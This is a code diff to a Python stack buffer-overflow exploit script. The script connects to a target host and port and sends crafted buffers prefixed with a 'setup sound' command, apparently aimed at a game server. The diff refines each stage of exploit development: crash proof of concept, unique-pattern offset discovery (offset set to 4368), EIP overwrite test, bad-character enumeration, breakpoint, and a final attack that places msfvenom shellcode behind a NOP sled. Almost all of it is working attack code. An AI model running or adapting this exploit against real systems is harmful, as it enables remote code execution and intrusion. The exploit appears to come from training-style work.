@@ -21,14 +21,14 @@ def pwn(ip, port, payload):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
 
-    offset = 4000
+    offset = 4368
     buffer_length = 4379
     if payload == 'proof':
         buf = concept(buffer_length)
     elif payload == 'unique':
         buf = unique()
     elif isinstance(payload, int):
-        buf = bin_search(payload)
+        buf = bin_search(payload, buffer_length)
     elif payload == 'test':
         buf = test(offset)
     elif payload == 'chars':
@@ -45,7 +45,7 @@ def pwn(ip, port, payload):
         print("[*] Banner: {}".format(data.strip(), end=''))
         s.send(buf)
         data = s.recv(1024)
-        print("[*] Auth response: {}".format(data.strip()))
+        print("[*] Data: {}".format(data.strip()))
         print("[*] Done")
     except socket.timeout:
         print("[*] ERROR: Socket timeout at {} seconds... aborting".format(timeout))
@@ -60,8 +60,12 @@ def concept(buffer_length):
 
     """
     print("[*] Payload set as given proof of concept")
+
     crash = '\x41' * buffer_length
-    buf = '\x11(setup sound ' + crash + '\x90\x00#'
+
+    buf = '\x11(setup sound ' 
+    buf += crash
+    buf += '\x90\x00#'
 
     return buf
 
@@ -71,17 +75,23 @@ def unique():
 
     """
     print("[*] Payload set as unique string")
+
     with open('data/unique_4379byte_string.dat') as unique:
-        buf = '\x11(setup sound ' + unique.read() + '\x90\x00#'
+        payload = unique.read().strip()
+
+    buf = '\x11(setup sound ' 
+    buf += payload
+    buf += '\x90\x00#'
 
     return buf
 
 
-def bin_search(depth):
+def bin_search(depth, buffer_length):
     """ Create a buffer with evenly split number of chars.
 
     """
-    assert(payload <= 26)
+    assert(depth <= 26)
+
     buf = '\x11(setup sound '
     for letter in range(depth):
         buf += string.ascii_uppercase[letter] * int((buffer_length/depth))
@@ -95,8 +105,12 @@ def test(offset):
 
     """
     print("[*] Payload set to only overwrite the EIP")
-    buf = '\x11(setup sound ' + '\x41' * offset + struct.pack('<L', 0xffffffff) + \
-            '\x42' * 360 + '\x90\x00#'
+
+    buf = '\x11(setup sound ' 
+    buf += '\x41' * offset 
+    buf += struct.pack('<L', 0x42424242)
+    buf += '\x43' * 7
+    buf += '\x90\x00#'
 
     return buf
 
@@ -109,9 +123,10 @@ def bad_chars(buffer_length):
     # 0x00 (Null)
     # 0x0A (New Line '\n')
     # 0x0D (Carriage Return '\r')
+    # 0x20 (ASCII Space)
     good_chars = (
         "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
-        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
         "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
         "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
         "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
@@ -127,8 +142,12 @@ def bad_chars(buffer_length):
         "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
         "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 
-    print("[*] Payload set to test for bad chars")
-    buf =  '\x11(setup sound ' + good_chars + A * buffer_length
+    print("[*] Payload set to test {} chars for incompatability".format(len(good_chars)))
+
+    buf = '\x11(setup sound ' 
+    buf += good_chars
+    buf += 'A' * (buffer_length - len(good_chars))
+    buf += '\x90\x00#'
 
     return buf
 
@@ -138,8 +157,11 @@ def breakpoint(offset):
 
     """
     print("[*] Payload set to breakpoint on entry to shellcode section")
-    buf = '\x11(setup sound ' + '\x41' * offset + struct.pack('<L', 0xffffffff) + \
-            + '\xcc' * 8 + '\x47' * 360 + '\x90\x00#'
+    buf = '\x11(setup sound ' 
+    buf += '\x41' * offset
+    buf += struct.pack('<L', 0xffffffff)
+    buf += '\xcc' * 7
+    buf += '\x90\x00#'
 
     return buf
 
@@ -148,12 +170,19 @@ def attack(offset, payload):
     """ Overwrite EIP and inject shellcode
 
     """
-    shellcode = get_shellcode(payload)
     print("[*] Payload set to attack")
-    buf = '\x11(setup sound ' + '\x41' * offset + struct.pack('<L', 0xffffffff) + \
-            + '\x90' * 8 + shellcode + '\x90\x00#'
+
+    shellcode = get_shellcode(payload)
+
+    buf = '\x11(setup sound '
+    buf += '\x41' * offset
+    buf += struct.pack('<L', 0xffffffff)
+    buf += '\x90' * 8
+    buf += shellcode
+    buf += '\x90\x00#'
 
     return buf
+
 
 def get_shellcode(location):
     """ Read an msfvenom genterated shellcode file and format it to be sent.
